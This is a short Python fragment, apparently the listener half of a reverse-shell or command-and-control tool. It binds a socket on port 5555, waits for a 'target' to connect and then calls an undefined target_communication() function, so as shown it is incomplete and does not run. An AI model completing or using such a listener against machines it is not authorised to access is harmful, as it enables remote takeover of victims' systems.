import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('#your ip', 5555))
print('[+] waiting')
sock.listen(5)

target, ip = sock.accept()
print('[+] ready' + str(ip))
target_communication()

